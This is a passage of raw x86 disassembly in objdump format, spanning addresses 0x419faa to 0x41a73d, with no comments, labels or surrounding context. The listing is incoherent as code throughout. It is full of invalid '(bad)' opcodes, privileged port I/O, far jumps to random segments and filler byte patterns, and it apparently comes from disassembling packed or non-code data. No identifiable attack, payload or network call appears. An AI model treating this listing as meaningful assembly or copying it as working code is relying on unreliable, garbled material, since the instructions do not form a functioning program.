  419faa:	jp     0x419fb1
  419fac:	std    
  419fad:	jb     0x419fa2
  419faf:	sti    
  419fb0:	addr16 test eax,0x82ffeae1
  419fb6:	das    
  419fb7:	jns    0x419ffc
  419fb9:	mov    ch,0xe1
  419fbb:	sbb    eax,DWORD PTR [edx-0x7bfa9191]
  419fc1:	test   eax,0xeb5b801e
  419fc6:	jbe    0x419fca
  419fc8:	data16 test al,0x34
  419fcb:	cmp    DWORD PTR [eax],ecx
  419fcd:	inc    edi
  419fce:	mov    eax,0xd4e1ccbf
  419fd3:	inc    esp
  419fd4:	inc    ebx
  419fd5:	cwde   
  419fd6:	icebp  
  419fd7:	popf   
  419fd8:	mov    esi,0x7ffaa22c
  419fdd:	sbb    al,0x9d
  419fdf:	add    cl,BYTE PTR ds:0xc6d1317c
  419fe5:	fiadd  DWORD PTR [eax]
  419fe7:	add    BYTE PTR [eax],al
  419fe9:	add    BYTE PTR [eax],al
  419feb:	jg     0x41a067
  419fed:	inc    ebx
  419fee:	mov    ch,0xb8
  419ff0:	mov    eax,0x7ad0f7f7
  419ff5:	inc    ebx
  419ff6:	test   edx,esi
  419ff8:	inc    edx
  419ff9:	add    eax,0xfdbbc007
  419ffe:	fdiv   QWORD PTR [ebp-0x64]
  41a001:	ss icebp 
  41a003:	repnz cld 
  41a005:	inc    esp
  41a006:	push   0x31
  41a008:	sti    
  41a009:	cmp    ah,cl
  41a00b:	jle    0x419f9d
  41a00d:	jmp    0x41a00f
  41a00f:	ja     0x41a08a
  41a011:	cmc    
  41a012:	jne    0x419fa9
  41a014:	clc    
  41a015:	inc    eax
  41a016:	clc    
  41a017:	pop    ss
  41a018:	dec    ecx
  41a019:	cmc    
  41a01a:	imul   edx,DWORD PTR [ebp-0x7f8a75fb],0xffffffe6
  41a021:	mov    dl,0xfb
  41a023:	dec    esp
  41a024:	inc    DWORD PTR [ebx-0x27cac40]
  41a02a:	add    DWORD PTR [edi+edi*8+0x66],ebx
  41a02e:	inc    DWORD PTR [ebp-0x4]
  41a031:	js     0x41a01f
  41a033:	out    0x5,al
  41a035:	mov    al,BYTE PTR [ebp-0x70]
  41a038:	dec    esi
  41a039:	push   esp
  41a03a:	call   0x419b06
  41a03f:	inc    ebp
  41a040:	daa    
  41a041:	stc    
  41a042:	inc    DWORD PTR [ebx+0x67]
  41a045:	cmp    eax,0x69ff2777
  41a04a:	add    DWORD PTR [ebx+0x72],eax
  41a04d:	add    eax,0xe8
  41a052:	add    BYTE PTR [eax],al
  41a054:	lahf   
  41a055:	mov    edx,edi
  41a057:	call   FWORD PTR [eax-0x237bf541]
  41a05d:	std    
  41a05e:	(bad)  
  41a05f:	call   DWORD PTR [edi+0x7a]
  41a062:	add    eax,0x186f9c68
  41a067:	add    BYTE PTR [esi-0x17ba7704],al
  41a06d:	dec    esi
  41a06e:	in     eax,0xda
  41a070:	xor    eax,edi
  41a072:	cli    
  41a073:	test   BYTE PTR [eax+ecx*1],bl
  41a076:	xor    DWORD PTR [ebp+0xefffecd],0x83e14a7b
  41a080:	jg     0x41a0cc
  41a082:	std    
  41a083:	mov    bl,BYTE PTR [ebp+0x22]
  41a086:	cld    
  41a087:	add    BYTE PTR [esi+edi*8+0x2175e0bc],cl
  41a08e:	inc    esp
  41a08f:	out    0x7d,eax
  41a091:	and    BYTE PTR [esi+eiz*2-0x4],al
  41a095:	push   edi
  41a096:	mov    ecx,0xf9d8f865
  41a09b:	sub    ebx,0x18
  41a09e:	add    DWORD PTR [eax],eax
  41a0a0:	cmp    BYTE PTR [eax+0x9],0xbf
  41a0a4:	push   edx
  41a0a5:	out    dx,al
  41a0a6:	ja     0x41a119
  41a0a8:	mov    ecx,0xa7e83a74
  41a0ad:	adc    al,0x1
  41a0af:	add    cl,bh
  41a0b1:	sub    edi,edx
  41a0b3:	or     esp,0xffffffea
  41a0b6:	add    BYTE PTR [eax],al
  41a0b8:	add    BYTE PTR [eax],al
  41a0ba:	add    BYTE PTR [eax],al
  41a0bc:	add    ch,cl
  41a0be:	stos   DWORD PTR es:[edi],eax
  41a0bf:	xchg   ecx,eax
  41a0c0:	sbb    BYTE PTR [ebp-0x60],dh
  41a0c3:	or     DWORD PTR [esi],esi
  41a0c5:	(bad)  
  41a0c6:	outs   dx,BYTE PTR ds:[esi]
  41a0c7:	stc    
  41a0c8:	out    0xf3,eax
  41a0ca:	jbe    0x41a0d3
  41a0cc:	std    
  41a0cd:	stc    
  41a0ce:	stos   DWORD PTR es:[edi],eax
  41a0cf:	test   BYTE PTR [ebx+0xea94],0xf6
  41a0d6:	inc    esi
  41a0d7:	hlt    
  41a0d8:	inc    DWORD PTR [edi-0x55]
  41a0db:	dec    ebp
  41a0dc:	add    BYTE PTR [edx],al
  41a0de:	in     al,dx
  41a0df:	add    BYTE PTR [esi+0x3e],ah
  41a0e2:	sub    al,0xbc
  41a0e4:	jo     0x41a12d
  41a0e6:	add    cl,BYTE PTR fs:0xbef43722
  41a0ed:	aam    0xed
  41a0ef:	jns    0x41a13c
  41a0f1:	int    0xec
  41a0f3:	cmp    BYTE PTR [ecx-0x40eb9b8c],cl
  41a0f9:	rcr    ebx,cl
  41a0fb:	jnp    0x41a0f5
  41a0fd:	xchg   esi,eax
  41a0fe:	test   edx,edi
  41a100:	hlt    
  41a101:	push   0x41
  41a103:	mov    DWORD PTR [eax],eax
  41a105:	mov    ah,0x89
  41a107:	sti    
  41a108:	mov    esi,0xfcef029d
  41a10d:	test   eax,0x8afd2925
  41a112:	mov    edx,DWORD PTR [edi]
  41a114:	jge    0x41a14a
  41a116:	inc    esi
  41a117:	bound  ecx,QWORD PTR [edi-0x5513936e]
  41a11d:	dec    ebx
  41a11e:	push   cs
  41a11f:	in     eax,0x8e
  41a121:	add    BYTE PTR [eax],al
  41a123:	add    BYTE PTR [eax],al
  41a125:	add    BYTE PTR [ebp-0x75],dh
  41a128:	mov    eax,ds:0xd74771b7
  41a12d:	mov    eax,ds:0xa1f74efd
  41a132:	popf   
  41a133:	dec    ebp
  41a134:	scas   eax,DWORD PTR es:[edi]
  41a135:	xchg   ebp,eax
  41a136:	and    ebp,ebp
  41a138:	jmp    0x41a187
  41a13a:	jne    0x41a13d
  41a13c:	out    0x3,eax
  41a13e:	cld    
  41a13f:	inc    esp
  41a140:	mov    bl,0x7c
  41a142:	sub    eax,0xedf407c3
  41a147:	icebp  
  41a148:	leave  
  41a149:	adc    eax,0x1461d07c
  41a14e:	jmp    0x9511:0x24e4eeef
  41a155:	mov    ah,0xa9
  41a157:	ret    
  41a158:	(bad)  
  41a159:	sti    
  41a15a:	jge    0x41a12c
  41a15c:	loope  0x41a19b
  41a15e:	repnz dec esp
  41a160:	pop    ss
  41a161:	test   ebp,edi
  41a163:	push   es
  41a164:	xor    al,0xd7
  41a166:	cmc    
  41a167:	jl     0x41a13c
  41a169:	add    eax,DWORD PTR [eax-0x17f32479]
  41a16f:	add    BYTE PTR [edi],cl
  41a171:	add    BYTE PTR [ecx+0x2],bh
  41a174:	out    0x9d,eax
  41a176:	jb     0x41a179
  41a178:	fsubr  QWORD PTR [ebx]
  41a17a:	stos   DWORD PTR es:[edi],eax
  41a17b:	inc    esp
  41a17c:	out    0x8,eax
  41a17e:	data16 es fadd st,st(3)
  41a182:	ret    0x2989
  41a185:	call   0xe6416381
  41a18a:	add    BYTE PTR [eax],al
  41a18c:	add    BYTE PTR [eax],al
  41a18e:	add    BYTE PTR [ebx],dh
  41a190:	out    dx,eax
  41a191:	stc    
  41a192:	outs   dx,BYTE PTR ds:[esi]
  41a193:	jge    0x41a17e
  41a195:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a196:	jmp    0xdb3ea411
  41a19b:	xchg   edx,eax
  41a19c:	call   0x2b7f3b4
  41a1a1:	or     edx,0x20e80092
  41a1a7:	jo     0x41a1a8
  41a1a9:	cld    
  41a1aa:	shl    DWORD PTR [esi+0x10e91975],1
  41a1b0:	add    edi,ebp
  41a1b2:	mov    ah,0x6e
  41a1b4:	call   0xfdaf15ec
  41a1b9:	sub    DWORD PTR [ecx],0x5d
  41a1bc:	test   BYTE PTR [esi-0x17],bh
  41a1bf:	jbe    0x41a1c3
  41a1c1:	mov    DWORD PTR [esi+ecx*2+0x517e4068],ecx
  41a1c8:	add    BYTE PTR [edi-0x27],ah
  41a1cb:	ret    
  41a1cc:	inc    ebx
  41a1cd:	mov    ah,0x99
  41a1cf:	mov    cs,WORD PTR [ecx-0x798d1175]
  41a1d5:	mov    edi,0x7b7fff5d
  41a1da:	xchg   ebp,eax
  41a1db:	adc    DWORD PTR [esp+ecx*1+0x69],esi
  41a1df:	cld    
  41a1e0:	mov    bl,0xf
  41a1e2:	push   ebp
  41a1e3:	or     eax,DWORD PTR [eax+0x75017d7b]
  41a1e9:	pop    eax
  41a1ea:	imul   ebp,esp,0x273cffb6
  41a1f0:	mov    di,0x24
  41a1f4:	add    BYTE PTR [eax],al
  41a1f6:	add    BYTE PTR [eax],al
  41a1f8:	cmp    DWORD PTR [edx],ecx
  41a1fa:	data16 test al,0xb4
  41a1fd:	mov    ecx,0x43300707
  41a202:	mov    esp,0xb67bf6e1
  41a207:	jmp    0x4eb1f8
  41a20c:	and    DWORD PTR [esi-0x78],eax
  41a20f:	inc    ebp
  41a210:	cmp    BYTE PTR [ecx+0x41],0xb4
  41a214:	mov    WORD PTR [ecx+0x3f],?
  41a217:	xor    DWORD PTR [eax+eax*2+0x1b8db741],ecx
  41a21e:	sar    edx,1
  41a220:	mov    WORD PTR [ebx],es
  41a222:	mov    al,BYTE PTR [ebp-0x10]
  41a225:	inc    esi
  41a226:	call   0x3e04b62e
  41a22b:	jmp    0x3cac05
  41a230:	jns    0xf171a246
  41a236:	sti    
  41a237:	jne    0x41a279
  41a239:	or     BYTE PTR [ecx],dl
  41a23b:	or     BYTE PTR [edi-0x3d],bl
  41a23e:	cld    
  41a23f:	jmp    0x8ef:0xe7fc9953
  41a246:	add    BYTE PTR [eax],al
  41a248:	xlat   BYTE PTR ds:[ebx]
  41a249:	adc    ebp,eax
  41a24b:	pop    esi
  41a24c:	inc    ebx
  41a24d:	or     bl,bh
  41a24f:	inc    ecx
  41a251:	pop    ss
  41a252:	call   0x44c8bb
  41a257:	jmp    0x41a299
  41a259:	jl     0x41a24a
  41a25b:	call   0x41a260
  41a260:	add    BYTE PTR [ecx+0xf],ch
  41a263:	sti    
  41a264:	inc    DWORD PTR [edi-0x4]
  41a267:	sti    
  41a268:	jne    0x41a29e
  41a26a:	or     BYTE PTR [ecx+0x8],dh
  41a26d:	xor    al,0x94
  41a26f:	repz (bad) 
  41a271:	cmp    ebp,DWORD PTR [eax+0x40c55b5a]
  41a277:	adc    BYTE PTR [eax],al
  41a279:	xchg   edx,eax
  41a27a:	jnp    0x41a26c
  41a27c:	test   DWORD PTR [edx],esp
  41a27e:	(bad)  
  41a27f:	dec    ebp
  41a280:	mov    dl,dl
  41a282:	jle    0x41a244
  41a284:	je     0x41a22d
  41a286:	ror    esi,cl
  41a288:	cmp    al,0x75
  41a28a:	(bad)  
  41a28b:	pop    DWORD PTR [edx]
  41a28d:	pop    edi
  41a28e:	jmp    0x41a236
  41a290:	call   0x731b680e
  41a295:	je     0x41a2be
  41a297:	jp     0x41a2a7
  41a299:	addr16 test eax,0xed65f780
  41a29f:	in     eax,dx
  41a2a0:	push   eax
  41a2a1:	cmc    
  41a2a2:	popa   
  41a2a3:	int3   
  41a2a4:	jl     0x41a22b
  41a2a6:	pushf  
  41a2a7:	div    ch
  41a2a9:	sahf   
  41a2aa:	jmp    0xe76:0xa7452c43
  41a2b1:	cmc    
  41a2b2:	inc    ecx
  41a2b3:	sar    DWORD PTR [edx-0x72],1
  41a2b6:	mov    ds:0xe8e9c77c,eax
  41a2bb:	or     edx,0xc04adc74
  41a2c1:	imul   ebp,DWORD PTR [edx],0xffffffff
  41a2c4:	jae    0x41a2c6
  41a2c6:	add    BYTE PTR [eax],al
  41a2c8:	add    BYTE PTR [eax],al
  41a2ca:	jae    0x41a25e
  41a2cc:	inc    eax
  41a2cd:	std    
  41a2ce:	jne    0x41a2bb
  41a2d0:	add    BYTE PTR [eax+0x5e3f6072],cl
  41a2d6:	ss xchg edx,eax
  41a2d8:	clc    
  41a2d9:	push   edi
  41a2da:	xor    esp,ebp
  41a2dc:	add    BYTE PTR [esi+0x36],bl
  41a2df:	lahf   
  41a2e0:	jns    0x41a2ce
  41a2e2:	idiv   bh
  41a2e4:	in     eax,dx
  41a2e5:	push   eax
  41a2e6:	retf   
  41a2e7:	cmp    al,0x9c
  41a2e9:	inc    DWORD PTR [ebx+0x5568042b]
  41a2ef:	cld    
  41a2f0:	sar    bh,0x12
  41a2f3:	(bad)  
  41a2f5:	inc    BYTE PTR [edx]
  41a2f7:	jno    0x41a325
  41a2f9:	xor    DWORD PTR [ebx],eax
  41a2fb:	add    DWORD PTR [esi],esp
  41a2fd:	je     0x41a36c
  41a2ff:	pusha  
  41a300:	call   DWORD PTR [ebp+0x46]
  41a303:	lods   al,BYTE PTR ds:[esi]
  41a304:	jae    0x41a302
  41a306:	jne    0x41a30a
  41a308:	out    0x3,eax
  41a30a:	in     al,dx
  41a30b:	add    DWORD PTR ds:0xc692d1b1,esi
  41a311:	add    dh,BYTE PTR [ebp+0x2]
  41a314:	bound  eax,QWORD PTR [ecx]
  41a316:	dec    edi
  41a317:	std    
  41a318:	sbb    DWORD PTR ds:0x3e81ae5,eax
  41a31e:	jne    0x41a2a9
  41a320:	jmp    0x573ee8d2
  41a325:	hlt    
  41a326:	mov    ds:0x7478e6fd,eax
  41a32b:	(bad)  
  41a32c:	stos   DWORD PTR es:[edi],eax
  41a32d:	pop    es
  41a32e:	add    BYTE PTR [eax],al
  41a330:	add    BYTE PTR [eax],al
  41a332:	add    BYTE PTR [edx+0x6a],al
  41a335:	imul   esp
  41a337:	dec    edx
  41a338:	add    bh,BYTE PTR [edx+0x26876504]
  41a33e:	(bad)  
  41a33f:	aas    
  41a340:	(bad)  
  41a341:	mov    ds:0xdbfdc517,eax
  41a346:	ret    
  41a347:	test   DWORD PTR [edx-0x19],eax
  41a34a:	cdq    
  41a34b:	ins    DWORD PTR es:[edi],dx
  41a34c:	pop    edx
  41a34d:	lea    edi,[edx-0x4a]
  41a350:	out    dx,al
  41a351:	imul   ebx,DWORD PTR [eax],0x9e273165
  41a357:	repz inc esi
  41a359:	adc    edi,DWORD PTR [ecx-0x4a]
  41a35c:	(bad)  
  41a35d:	jno    0x41a35b
  41a35f:	in     eax,dx
  41a360:	std    
  41a361:	imul   ecx,DWORD PTR [edi+0x5f4ba71e],0xffffff9d
  41a368:	push   ds
  41a369:	jbe    0x41a32e
  41a36b:	and    cl,BYTE PTR [ebp-0x74]
  41a36e:	add    al,0xea
  41a370:	inc    ecx
  41a371:	call   0x2bcb1879
  41a376:	or     ah,bh
  41a378:	or     DWORD PTR [edi],esi
  41a37a:	add    eax,0xa6260ab2
  41a37f:	in     eax,dx
  41a380:	shl    BYTE PTR [ecx],0x3b
  41a383:	mov    ah,0x56
  41a385:	add    BYTE PTR [edx-0x7e],ah
  41a388:	sub    ebx,0xffffffd1
  41a38b:	and    eax,0x1baf5557
  41a390:	(bad)  
  41a391:	call   DWORD PTR [eax-0x690301f7]
  41a397:	add    BYTE PTR [eax],al
  41a399:	add    BYTE PTR [eax],al
  41a39b:	add    BYTE PTR [ebp-0x26],cl
  41a39e:	xor    BYTE PTR [edx+0x2c8b5bf2],0x59
  41a3a5:	push   edx
  41a3a6:	std    
  41a3a7:	aam    0xb6
  41a3a9:	adc    DWORD PTR [eax-0x17],eax
  41a3ac:	or     al,0x5
  41a3ae:	pop    eax
  41a3af:	outs   dx,BYTE PTR ds:[esi]
  41a3b0:	repz add al,0x66
  41a3b3:	jo     0x41a390
  41a3b5:	in     al,0xfc
  41a3b7:	hlt    
  41a3b8:	rcl    BYTE PTR [ecx],cl
  41a3ba:	inc    eax
  41a3bb:	jmp    0x6531e4cf
  41a3c0:	ss jbe 0x41a3fb
  41a3c3:	jb     0x41a43a
  41a3c5:	mov    DWORD PTR [edx+0x41],ecx
  41a3c8:	daa    
  41a3c9:	sub    ebx,0xffffffd9
  41a3cc:	in     eax,dx
  41a3cd:	dec    BYTE PTR [edx-0x5d60814c]
  41a3d3:	dec    esp
  41a3d4:	and    eax,0x6e79fca1
  41a3d9:	add    al,BYTE PTR [eax]
  41a3db:	jmp    0xe2b466ab
  41a3e0:	loopne 0x41a364
  41a3e2:	jp     0x41a3e5
  41a3e4:	jno    0x41a455
  41a3e6:	add    al,0x27
  41a3e8:	repz (bad) 
  41a3ea:	(bad)  
  41a3eb:	arpl   bx,bp
  41a3ed:	jecxz  0x41a43e
  41a3ef:	out    dx,al
  41a3f0:	adc    BYTE PTR [ecx+edx*1+0x29],al
  41a3f4:	jno    0x41a378
  41a3f6:	jp     0x41a3d6
  41a3f8:	jns    0x41a469
  41a3fa:	or     BYTE PTR [edx+0x72],ah
  41a3fd:	push   ecx
  41a3fe:	std    
  41a3ff:	cmp    DWORD PTR [eax],eax
  41a401:	add    BYTE PTR [eax],al
  41a403:	add    BYTE PTR [eax],al
  41a405:	jno    0x41a438
  41a407:	fld    DWORD PTR [eax]
  41a409:	push   ebx
  41a40a:	pusha  
  41a40b:	xchg   ebx,eax
  41a40d:	xchg   edi,eax
  41a40e:	int    0xbe
  41a410:	add    al,0xdc
  41a412:	pop    edx
  41a413:	xchg   esp,ebp
  41a415:	jge    0x41a3a2
  41a417:	add    cl,BYTE PTR [ebp+0x564d02a1]
  41a41d:	repz push esi
  41a41f:	push   0x47b1c85
  41a424:	cmp    DWORD PTR [ecx+0x2],0x0
  41a428:	mov    ecx,edx
  41a42a:	pop    ecx
  41a42b:	sti    
  41a42c:	push   eax
  41a42d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a42e:	mov    WORD PTR [ecx-0x4],es
  41a431:	aad    0xc3
  41a433:	data16 sub BYTE PTR [esi+edx*8+0x71],dh
  41a438:	inc    ebx
  41a439:	mov    edi,fs
  41a43b:	push   ss
  41a43c:	in     al,dx
  41a43d:	popf   
  41a43e:	inc    DWORD PTR [esi-0x28cb6b8b]
  41a444:	cmp    BYTE PTR [ecx-0x73bc2641],dl
  41a44a:	jp     0x41a479
  41a44c:	mov    edi,0x3fe164
  41a451:	or     eax,DWORD PTR [eax]
  41a453:	adc    DWORD PTR [eax],ebx
  41a455:	ds aas 
  41a457:	add    BYTE PTR [eax],bh
  41a459:	jno    0x41a421
  41a45b:	fld    DWORD PTR [ebx+0x5c]
  41a45e:	jp     0x41a476
  41a460:	call   0x41c3db
  41a465:	fadd   st,st(6)
  41a467:	jo     0x41a476
  41a469:	add    BYTE PTR [eax],al
  41a46b:	add    BYTE PTR [eax],al
  41a46d:	add    ch,al
  41a46f:	and    esp,eax
  41a471:	fstp   st(7)
  41a473:	inc    ch
  41a475:	add    eax,0x3fe15c
  41a47a:	or     eax,0x7015fb58
  41a47f:	adc    al,0x40
  41a481:	add    BYTE PTR [ebp+0x758dfc62],al
  41a487:	cs int3 
  41a489:	dec    edi
  41a48a:	or     eax,0xfafe93f1
  41a48f:	jne    0x41a4d9
  41a491:	enter  0xbc45,0x77
  41a495:	or     al,0xdd
  41a497:	aam    0x8d
  41a499:	(bad)  
  41a49a:	loop   0x41a4fd
  41a49c:	pop    es
  41a49d:	jmp    0x40027d0d
  41a4a2:	mov    dh,0x6f
  41a4a4:	push   0x8db086e8
  41a4a9:	jb     0x41a518
  41a4ab:	bound  ebx,QWORD PTR [edi]
  41a4ad:	sub    DWORD PTR [eax],0xb5310185
  41a4b3:	rcr    DWORD PTR [esi],0xd
  41a4b6:	add    BYTE PTR [ecx-0x16712518],ch
  41a4bc:	add    dl,al
  41a4be:	ins    DWORD PTR es:[edi],dx
  41a4bf:	jmp    0xc95ead2e
  41a4c4:	ja     0x41a507
  41a4c6:	jne    0x41a509
  41a4c8:	xchg   esi,eax
  41a4c9:	call   0x62c78e42
  41a4ce:	jns    0x41a4b8
  41a4d0:	lea    eax,[edx+0x0]
  41a4d3:	add    BYTE PTR [eax],al
  41a4d5:	add    BYTE PTR [eax],al
  41a4d7:	jge    0x41a511
  41a4d9:	xor    eax,ebp
  41a4db:	test   al,0x64
  41a4dd:	add    al,0x0
  41a4df:	dec    esi
  41a4e0:	loope  0x41a517
  41a4e2:	shl    BYTE PTR [ebp+0x5d628e2c],0x6d
  41a4e9:	push   eax
  41a4ea:	cld    
  41a4eb:	dec    edx
  41a4ec:	gs dec eax
  41a4ee:	or     dh,dh
  41a4f0:	retf   
  41a4f1:	add    al,ch
  41a4f3:	or     eax,0x37000415
  41a4f8:	loopne 0x41a4fa
  41a4fa:	push   0x79
  41a4fc:	adc    DWORD PTR [eax+0x73],0xffffffb6
  41a500:	jmp    0x41a4ea
  41a502:	pop    ebp
  41a503:	push   cs
  41a504:	add    ebp,eax
  41a506:	add    esi,esp
  41a508:	pop    edi
  41a509:	fild   DWORD PTR [esp+edi*8]
  41a50c:	aas    
  41a50d:	fild   WORD PTR [eax]
  41a50f:	inc    ebp
  41a510:	jmp    0x476f:0xf9fa819e
  41a517:	fldln2 
  41a519:	in     al,dx
  41a51a:	xor    al,0xb5
  41a51c:	inc    edx
  41a51d:	stos   BYTE PTR es:[edi],al
  41a51e:	lea    edx,[edi-0x16]
  41a521:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a522:	inc    edi
  41a523:	rcr    DWORD PTR [edx-0x7a2ffe5b],1
  41a529:	sub    eax,DWORD PTR [eax]
  41a52b:	enter  0x2b8d,0xe8
  41a52f:	fisub  DWORD PTR [esi-0x7e]
  41a532:	add    esi,DWORD PTR [ebp-0x3c]
  41a535:	jmp    0x44:0xf061f03
  41a53c:	add    BYTE PTR [eax],al
  41a53e:	add    BYTE PTR [eax],al
  41a540:	es inc ebp
  41a542:	out    0xeb,eax
  41a544:	push   esp
  41a545:	in     eax,dx
  41a546:	out    0x3,eax
  41a548:	hlt    
  41a549:	pop    edi
  41a54a:	arpl   WORD PTR [esp+edi*8],ax
  41a54d:	aas    
  41a54e:	out    dx,eax
  41a54f:	add    BYTE PTR [ebp-0x16],al
  41a552:	push   edx
  41a553:	add    DWORD PTR [edx-0x6eb8a007],0x3534f4ed
  41a55d:	inc    edx
  41a55e:	sub    cl,BYTE PTR [ebp+0x472dead7]
  41a564:	pop    ecx
  41a565:	call   0xffb3:0x8558012d
  41a56c:	push   ecx
  41a56d:	lea    esp,[ebx+0x23252e7]
  41a573:	add    esi,DWORD PTR [ebp-0x3c]
  41a576:	loop   0x41a57b
  41a578:	iret   
  41a579:	push   0xffffff8f
  41a57b:	xor    esp,DWORD PTR [esi+0x10ebe745]
  41a581:	in     al,dx
  41a582:	jmp    edi
  41a584:	jbe    0x41a511
  41a586:	jb     0x41a565
  41a588:	popa   
  41a589:	test   DWORD PTR [esi+0x554f7564],0x554fac36
  41a593:	fs mov ebx,0xb3624f8a
  41a599:	or     bh,ch
  41a59b:	stc    
  41a59c:	ficom  WORD PTR [edx]
  41a59e:	jge    0x41a588
  41a5a0:	jbe    0x41a523
  41a5a2:	inc    edx
  41a5a3:	int    0x0
  41a5a5:	add    BYTE PTR [eax],al
  41a5a7:	add    BYTE PTR [eax],al
  41a5a9:	stc    
  41a5aa:	dec    ebx
  41a5ab:	cld    
  41a5ac:	scas   al,BYTE PTR es:[edi]
  41a5ad:	leave  
  41a5ae:	push   cs
  41a5af:	xor    DWORD PTR [ecx+0x488c336],ebp
  41a5b5:	fldcw  WORD PTR [edx-0x68]
  41a5b8:	xor    esi,ebp
  41a5ba:	inc    ebx
  41a5bb:	in     al,0x6a
  41a5bd:	sub    esi,esi
  41a5bf:	cld    
  41a5c0:	mov    edx,0xed728b75
  41a5c5:	imul   edi,DWORD PTR [edi-0x70193f4],0xef59e9fc
  41a5cf:	or     al,0x6d
  41a5d1:	in     al,0xf8
  41a5d3:	cld    
  41a5d4:	jmp    0xbf96dff1
  41a5d9:	jne    0x41a5f0
  41a5db:	push   eax
  41a5dc:	div    DWORD PTR [esi]
  41a5de:	add    al,BYTE PTR [ecx-0x769f7dd3]
  41a5e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5e5:	(bad)  
  41a5e6:	pop    ebp
  41a5e7:	xchg   edi,ebp
  41a5e9:	int3   
  41a5ea:	mov    DWORD PTR [edx+0x5d],eax
  41a5ed:	int3   
  41a5ee:	jg     0x41a635
  41a5f0:	jmp    0x41a5ce
  41a5f2:	mov    DWORD PTR [edx+0x79],eax
  41a5f5:	fdivr  QWORD PTR [edi+0x45]
  41a5f8:	in     eax,dx
  41a5f9:	int3   
  41a5fa:	mov    DWORD PTR [edx+0x75],eax
  41a5fd:	int3   
  41a5fe:	jg     0x41a645
  41a600:	add    BYTE PTR [edx],ah
  41a602:	xchg   DWORD PTR [ecx-0x64],eax
  41a605:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a606:	dec    ecx
  41a607:	or     BYTE PTR [ebx+0x4685a3d1],cl
  41a60d:	add    BYTE PTR [eax],al
  41a60f:	add    BYTE PTR [eax],al
  41a611:	add    BYTE PTR [edi+eax*4],bh
  41a614:	inc    ecx
  41a615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a616:	test   DWORD PTR [eax+0x14],eax
  41a619:	mov    edx,DWORD PTR [ecx-0x5a]
  41a61c:	test   DWORD PTR [esi+0x4],eax
  41a61f:	lea    eax,[ecx-0x54]
  41a622:	xchg   ebp,eax
  41a623:	inc    eax
  41a624:	sbb    al,0x66
  41a626:	addr16 dec ecx
  41a628:	mov    al,0x66
  41a62a:	gs inc eax
  41a62c:	and    BYTE PTR [esi+0x57],ah
  41a62f:	dec    ecx
  41a630:	mov    ah,0x66
  41a632:	push   ebp
  41a633:	inc    eax
  41a634:	and    ah,BYTE PTR [esi+0x47]
  41a637:	dec    ecx
  41a638:	mov    eax,0x24404566
  41a63d:	push   di
  41a63f:	dec    ecx
  41a640:	mov    esp,0x26405566
  41a645:	data16 daa 
  41a647:	dec    ecx
  41a648:	shl    BYTE PTR [esi+0x25],0x40
  41a64c:	sub    BYTE PTR [ebx+0x4685ca51],cl
  41a652:	fmul   DWORD PTR [ecx+eax*2+0x70bf5798]
  41a659:	nop    eax
  41a65c:	sub    al,0x56
  41a65e:	mov    esp,0xbc10e4be
  41a663:	clc    
  41a664:	adc    DWORD PTR [ecx*2-0x63ccffbd],eax
  41a66b:	out    0x3d,al
  41a66d:	jmp    0x694c:0x8c2034d
  41a674:	or     al,0x68
  41a676:	add    BYTE PTR [eax],al
  41a678:	add    BYTE PTR [eax],al
  41a67a:	add    BYTE PTR [edx+edi*2],bh
  41a67d:	aas    
  41a67e:	add    BYTE PTR [edi+ebp*8-0x1b],ah
  41a682:	add    DWORD PTR [ebp-0x17],esi
  41a685:	and    DWORD PTR [edx+0x39],0xfe0066e9
  41a68c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a68d:	or     ch,bh
  41a68f:	adc    DWORD PTR gs:0x8be9748c,edi
  41a696:	inc    edx
  41a697:	adc    DWORD PTR [esi+ecx*1],eax
  41a69a:	xor    DWORD PTR ds:0x9088c129,esi
  41a6a0:	rol    ebp,1
  41a6a2:	inc    edx
  41a6a3:	sbb    DWORD PTR [ecx-0x2],esi
  41a6a6:	cld    
  41a6a7:	cli    
  41a6a8:	imul   edx,DWORD PTR [eax-0x4],0xfffffff2
  41a6ac:	jae    0x41a6f6
  41a6ae:	in     al,0xdd
  41a6b0:	jmp    0x41a698
  41a6b2:	(bad)  
  41a6b3:	loop   0x41a65f
  41a6b5:	add    al,0x0
  41a6b7:	dec    edi
  41a6b8:	aad    0x68
  41a6ba:	adc    BYTE PTR [eax+0x2c],cl
  41a6bd:	add    al,0xe8
  41a6bf:	or     al,0x92
  41a6c1:	add    eax,DWORD PTR [eax]
  41a6c3:	test   BYTE PTR ds:0x1dee0000,0xc
  41a6ca:	std    
  41a6cb:	gs xchg ecx,eax
  41a6cd:	adc    DWORD PTR [esp+esi*2-0x66bd7417],eax
  41a6d4:	or     DWORD PTR [edx],0x31
  41a6d7:	mov    ch,0x28
  41a6d9:	ror    DWORD PTR [eax+0x42c65118],0x0
  41a6e0:	add    BYTE PTR [eax],al
  41a6e2:	add    BYTE PTR [eax],al
  41a6e4:	xchg   ecx,eax
  41a6e5:	cmp    ch,0xfc
  41a6e8:	sub    BYTE PTR [ebx+0x50],0xfc
  41a6ec:	jp     0x41a751
  41a6ee:	dec    eax
  41a6ef:	in     al,0x5d
  41a6f1:	and    eax,0x2a6afeec
  41a6f6:	add    eax,0x68dfcf00
  41a6fb:	add    al,ah
  41a6fd:	test   al,0x0
  41a6ff:	call   0x451a9d4
  41a704:	jne    0x41a687
  41a706:	cmp    edi,0x42
  41a709:	cmc    
  41a70a:	fwait
  41a70b:	adc    edi,DWORD PTR [eax]
  41a70d:	jo     0x41a6ea
  41a70f:	mov    dh,BYTE PTR [edi+0x1d33060a]
  41a715:	inc    esp
  41a716:	push   0x267f7504
  41a71b:	jnp    0x41a789
  41a71d:	mov    DWORD PTR [ebx+0x6a03fa17],ebx
  41a723:	adc    DWORD PTR [bp+di],eax
  41a726:	rcl    BYTE PTR [ecx],cl
  41a728:	cli    
  41a729:	aas    
  41a72a:	retf   
  41a72b:	jmp    0x44e8d898
  41a730:	mov    ah,0x89
  41a732:	dec    ebx
  41a733:	in     al,dx
  41a734:	mov    cl,0x3f
  41a736:	ret    
  41a737:	pushf  
  41a738:	loope  0x41a72f
  41a73a:	mov    ch,0x81
  41a73c:	das    
  41a73d:	imul   BYTE PTR [ebp-0x7121c877]
